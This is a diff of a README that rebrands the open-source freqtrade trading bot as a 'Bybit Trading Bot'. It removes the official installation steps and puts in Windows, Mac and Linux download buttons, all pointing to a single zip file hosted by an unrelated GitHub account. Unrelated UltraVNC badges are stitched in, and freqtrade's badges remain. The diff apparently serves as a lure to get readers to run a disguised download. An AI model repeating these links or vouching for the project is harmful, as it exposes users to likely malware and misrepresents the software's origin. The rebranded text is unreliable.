@@ -1,4 +1,5 @@
-# ![freqtrade](https://raw.githubusercontent.com/freqtrade/freqtrade/develop/docs/assets/freqtrade_poweredby.svg)
+## Latest bot updates on 08/17/2024
+# 🚀 Bybit Trading Bot - Trading Bot with Telegram Alert Web3 🚀
 
 [![Freqtrade CI](https://github.com/freqtrade/freqtrade/workflows/Freqtrade%20CI/badge.svg)](https://github.com/freqtrade/freqtrade/actions/)
 [![DOI](https://joss.theoj.org/papers/10.21105/joss.04864/status.svg)](https://doi.org/10.21105/joss.04864)
@@ -6,9 +7,9 @@
 [![Documentation](https://readthedocs.org/projects/freqtrade/badge/)](https://www.freqtrade.io)
 [![Maintainability](https://api.codeclimate.com/v1/badges/5737e6d668200b7518ff/maintainability)](https://codeclimate.com/github/freqtrade/freqtrade/maintainability)
 
-Freqtrade is a free and open source crypto trading bot written in Python. It is designed to support all major exchanges and be controlled via Telegram or webUI. It contains backtesting, plotting and money management tools as well as strategy optimization by machine learning.
+Bybit Trading Bot is a free and open source crypto trading bot written in Python. It is designed to support all major exchanges and be controlled via Telegram or webUI. It contains backtesting, plotting and money management tools as well as strategy optimization by machine learning.
 
-![freqtrade](https://raw.githubusercontent.com/freqtrade/freqtrade/develop/docs/assets/freqtrade-screenshot.png)
+![pgonzalezseda](https://github.com/pgonzalezseda/soll/blob/main/Bybit.jpg)
 
 ## Disclaimer
 
@@ -76,9 +77,24 @@ Please find the complete documentation on the [freqtrade website](https://www.fr
 
 ## Quick start
 
-Please refer to the [Docker Quickstart documentation](https://www.freqtrade.io/en/stable/docker_quickstart/) on how to get started quickly.
 
-For further (native) installation methods, please refer to the [Installation documentation page](https://www.freqtrade.io/en/stable/installation/).
+<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.1/releases/download/v5.81/Version_5.8.1.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-windows-187-675857.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.1/releases/download/v5.81/Version_5.8.1.zip">Bybit Trading Bot for Windows</a>
+
+
+<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.1/releases/download/v5.81/Version_5.8.1.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-apple-856-675863.png?f=webp&w=256" width=110  
+align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.1/releases/download/v5.81/Version_5.8.1.zip">Bybit Trading Bot for Mac</a>
+
+
+<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.1/releases/download/v5.81/Version_5.8.1.zip"><img src="https://cdn.iconscout.com/icon/free/png-512/free-linux-3049927-2538320.png?f=webp&w=256" width=100 align="middle"/></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/KlaipedaCryptoLTD/Version_5.8.1/releases/download/v5.81/Version_5.8.1.zip">Bybit Trading Bot for Linux</a> 
+
+  <a href="https://github.com/orgs/ultravnc/followers" target="_blank" rel="noopener"><img src="https://img.shields.io/github/followers/ultravnc?color=%23066da5&label=followers&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Followers"></a>
+  <a href="https://github.com/ultravnc/UltraVNC/watchers" target="_blank" rel="noopener"><img src="https://img.shields.io/github/watchers/ultravnc/UltraVNC?color=%23066da5&label=watchers&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Watchers"></a>
+  <a href="https://github.com/ultravnc/UltraVNC/network" target="_blank" rel="noopener"><img src="https://img.shields.io/github/forks/ultravnc/UltraVNC?color=%23066da5&label=forks&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Forks"></a>
+  <a href="https://github.com/ultravnc/UltraVNC/graphs/contributors" target="_blank" rel="noopener"><img src="https://img.shields.io/github/contributors/ultravnc/UltraVNC?color=%23066da5&label=contributors&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Contributors"></a>
+  <a href="https://github.com/ultravnc/UltraVNC/tags" target="_blank" rel="noopener"><img src="https://img.shields.io/github/v/tag/ultravnc/UltraVNC?color=%23066da5&label=tag&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Tags"></a>
+  <a href="https://github.com/ultravnc/UltraVNC/blob/main/LICENSE" target="_blank" rel="noopener"><img src="https://img.shields.io/github/license/ultravnc/UltraVNC?color=%23066da5&label=license&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub License"></a>
+  <a href="https://github.com/ultravnc/UltraVNC" target="_blank" rel="noopener"><img src="https://img.shields.io/github/last-commit/ultravnc/UltraVNC/main?color=%23066da5&label=last%20commit&logo=github&logoColor=%23fff&style=flat-square" alt="UltraVNC GitHub Last Commit"></a>
+</p>
 
 ## Basic Usage
 
